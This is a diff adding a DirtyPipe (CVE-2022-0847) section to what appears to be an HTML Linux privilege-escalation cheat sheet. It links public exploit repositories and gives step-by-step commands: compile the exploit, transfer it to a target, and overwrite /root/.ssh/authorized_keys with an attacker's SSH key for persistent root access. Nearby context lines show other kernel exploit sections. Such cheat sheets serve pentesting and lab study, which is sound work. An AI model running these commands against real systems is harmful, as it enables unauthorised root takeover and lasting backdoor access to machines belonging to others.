@@ -326,6 +326,21 @@ gcc <span class="nt">-march</span><span class="o">=</span>i686 <span class="nt">
 ./executablename
 </code></pre></div></div>
 
+<h2 id="dirtypipe---linux-kernel--58">DirtyPipe - Linux Kernel &lt;= 5.8</h2>
+
+<p>Download the exploit from the following repository <a href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/compile.sh">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/compile.sh</a>. Compile it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc exploit.c <span class="nt">-o</span> dirtypipe
+</code></pre></div></div>
+<p>Transfer the exploit to the target machine and execute it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./dirtypipe /root/.ssh/authorized_keys 1 $'\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo4ILTzBpODN8ubP+Qe3rhWgiPQqldRbCkkdcQb3vChet2SIVr3dM4Y5RQ11cYas1+bPT99nEuu++G7SiEN3juWhK3ymb9g+vC3DdACQbxsUhG4octS1K1N3D4grijfH9YfDoYW37VafhNE6PBa2mZu8KMBlTYRLOw1fP02ncZt0PFiYS0tD2lrKvr2nFBNDrJhRtHtMf6YUjlLEb7p2br/z4P40z0vNr2YpEDpTEorW6RTZ802DlinSMpCdkt\n'
+</code></pre></div></div>
+<ul>
+  <li><a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></li>
+  <li><a href="https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit">https://github.com/rahul1406/cve-2022-0847dirtypipe-exploit</a></li>
+</ul>
+
 <h2 id="ebpf_verifier---linux-kernel--4139">eBPF_verifier - Linux Kernel &lt; 4.13.9</h2>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gcc cve-2017-16995.c <span class="nt">-o</span> cve-2017-16995
